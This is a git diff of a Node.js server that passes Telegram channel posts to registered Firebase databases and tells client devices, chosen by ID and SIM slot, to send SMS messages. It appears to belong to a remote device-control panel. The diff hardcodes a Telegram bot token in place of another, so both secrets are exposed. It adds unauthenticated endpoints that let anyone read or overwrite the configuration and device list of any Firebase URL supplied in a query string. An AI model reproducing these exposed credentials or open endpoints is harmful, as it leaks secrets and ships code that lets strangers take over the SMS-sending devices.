@@ -12,7 +12,7 @@ const httpsAgent = new https.Agent({ keepAlive: true, maxSockets: 100 });
 const axiosInstance = axios.create({ httpAgent, httpsAgent, timeout: 10000 });
 
 const PORT = process.env.PORT || 3000;
-const BOT_TOKEN = '8951263426:AAHwMiQZY_QIuiHR17_rDNON9zwg-dT3mPc';
+const BOT_TOKEN = '8928344876:AAHhu5s2eAsfIQmOLjdjuwy_-JRD0fruwNA';
 const DATA_FILE = '/app/data/data.json';
 
 let store = { users: {} };
@@ -49,7 +49,7 @@ app.get('/', function (req, res) {
     else res.send('panel.html missing');
 });
 
-// ⭐ Register — har naya user yahan se aata hai
+// Register user
 app.post('/api/register', function (req, res) {
     const u = req.body.firebaseUrl;
     if (!u) return res.status(400).json({ error: 'missing url' });
@@ -67,7 +67,7 @@ app.post('/api/register', function (req, res) {
     res.json({ ok: true });
 });
 
-// ⭐ Unregister — panel se logout karne pe
+// Unregister
 app.post('/api/unregister', function (req, res) {
     const u = req.body.firebaseUrl;
     if (!u) return res.status(400).json({ error: 'missing url' });
@@ -87,6 +87,103 @@ app.get('/api/status', function (req, res) {
         userList: Object.keys(store.users)
     });
 });
+
+// ⭐ DEBUG — Firebase config browser me dekhne ke liye
+app.get('/api/debug-config', async function (req, res) {
+    try {
+        const url = req.query.url;
+        if (!url) {
+            const list = Object.keys(store.users);
+            return res.json({ 
+                users: list, 
+                hint: 'Add ?url=YOUR_FIREBASE_URL to see bot_config',
+                example: '/api/debug-config?url=' + (list[0] || 'YOUR_FIREBASE_URL')
+            });
+        }
+        const clean = url.replace(/\/$/, '');
+        const cfg = await fbGet(clean, 'bot_config');
+        const clients = await fbGet(clean, 'clients');
+
+        let deviceInfo = null;
+        if (clients && typeof clients === 'object') {
+            deviceInfo = Object.keys(clients).map(id => ({
+                id: id,
+                name: clients[id] && (clients[id].modelName || clients[id].model || id),
+                status: clients[id] && clients[id].status
+            }));
+        }
+
+        res.json({
+            firebaseUrl: clean,
+            bot_config: cfg,
+            channels_check: cfg && cfg.channels ? cfg.channels : null,
+            devices_check: cfg && cfg.devices ? cfg.devices : null,
+            legacy_tokenDevice: cfg && cfg.tokenDevice ? cfg.tokenDevice : null,
+            legacy_tokenEnabled: cfg && cfg.tokenEnabled ? cfg.tokenEnabled : null,
+            actual_devices: deviceInfo,
+            diagnosis: {
+                has_channels: cfg && cfg.channels && cfg.channels.length > 0,
+                has_devices: cfg && cfg.devices && Object.keys(cfg.devices).length > 0,
+                has_any_enabled_device: cfg && cfg.devices ? Object.values(cfg.devices).some(d => d && d.enabled === true) : false,
+                has_legacy_device: !!(cfg && cfg.tokenEnabled && cfg.tokenDevice)
+            }
+        });
+    } catch (e) {
+        res.json({ error: e.message });
+    }
+});
+
+// ⭐ FIX — Browser se hi bot_config set kar do
+app.get('/api/fix-config', async function (req, res) {
+    try {
+        const url = req.query.url;
+        const channel = req.query.channel;
+        const device = req.query.device;
+        const sim = parseInt(req.query.sim) || 0;
+
+        if (!url || !channel || !device) {
+            return res.json({ 
+                error: 'Missing params',
+                usage: '/api/fix-config?url=FIREBASE_URL&channel=CHANNEL_ID&device=DEVICE_ID&sim=0'
+            });
+        }
+
+        const clean = url.replace(/\/$/, '');
+        const cfg = {
+            channels: [channel],
+            devices: {},
+            updatedAt: Date.now()
+        };
+        cfg.devices[device] = {
+            enabled: true,
+            simSlot: sim,
+            deviceName: 'Auto-fixed',
+            updatedAt: Date.now()
+        };
+        cfg.tokenDevice = device;
+        cfg.tokenEnabled = true;
+        cfg.tokenSim = sim;
+
+        await Zp(clean, 'bot_config', cfg);
+        cfgCache[clean] = { cfg: cfg, at: Date.now() };
+
+        res.json({ 
+            ok: true, 
+            message: 'Config saved! Now test Telegram.',
+            saved_config: cfg
+        });
+    } catch (e) {
+        res.json({ error: e.message });
+    }
+});
+
+// Helper for PUT
+async function Zp(url, p, data) {
+    try {
+        const r = await axiosInstance.put(url.replace(/\/$/, '') + '/' + p + '.json', data);
+        return r.status === 200;
+    } catch (e) { return false; }
+}
 
 app.post('/api/notify-channel', async function (req, res) {
     try {
@@ -218,7 +315,6 @@ bot.on('channel_post', async function (ctx) {
     const urls = Object.keys(store.users);
     console.log('Checking', urls.length, 'users');
 
-    // ⭐ PARALLEL: Har user ka config check karo
     await Promise.all(urls.map(async function (fbUrl) {
         try {
             let cfg = getCfg(fbUrl);
@@ -227,15 +323,21 @@ bot.on('channel_post', async function (ctx) {
                 refreshCfg(fbUrl).catch(function () {});
             }
             if (!cfg) cfg = await refreshCfg(fbUrl);
-            if (!cfg) return;
+            if (!cfg) {
+                console.log('❌ No config for', fbUrl);
+                return;
+            }
 
-            // ⭐ SIRF us user ko bhejo jiska channel match kare
-            if (!cfg.channels || cfg.channels.indexOf(chatId) === -1) return;
+            console.log('  → Checking channels:', JSON.stringify(cfg.channels), 'against', chatId);
+
+            if (!cfg.channels || cfg.channels.indexOf(chatId) === -1) {
+                console.log('  → Channel mismatch, skipping');
+                return;
+            }
 
             let targetDevice = null;
             let simSlot = 0;
 
-            // Naya per-device structure
             if (cfg.devices && typeof cfg.devices === 'object') {
                 const enabled = Object.entries(cfg.devices).filter(([id, d]) => d && d.enabled === true);
                 if (enabled.length > 0) {
@@ -244,18 +346,20 @@ bot.on('channel_post', async function (ctx) {
                 }
             }
 
-            // Legacy fallback
             if (!targetDevice && cfg.tokenEnabled && cfg.tokenDevice) {
                 targetDevice = cfg.tokenDevice;
                 simSlot = cfg.tokenSim || 0;
             }
 
-            if (!targetDevice) return;
+            if (!targetDevice) {
+                console.log('  → No enabled device');
+                return;
+            }
 
             const clean = String(tok.number).trim();
             const ts = Date.now();
 
-            console.log('✅ MATCH! Sending to device:', targetDevice, 'SIM:', simSlot, '| Firebase:', fbUrl);
+            console.log('✅ MATCH! Sending to device:', targetDevice, 'SIM:', simSlot);
 
             const fbStart = Date.now();
             await fbPut(fbUrl, 'clients/' + targetDevice + '/webhookEvent/sendSms', {
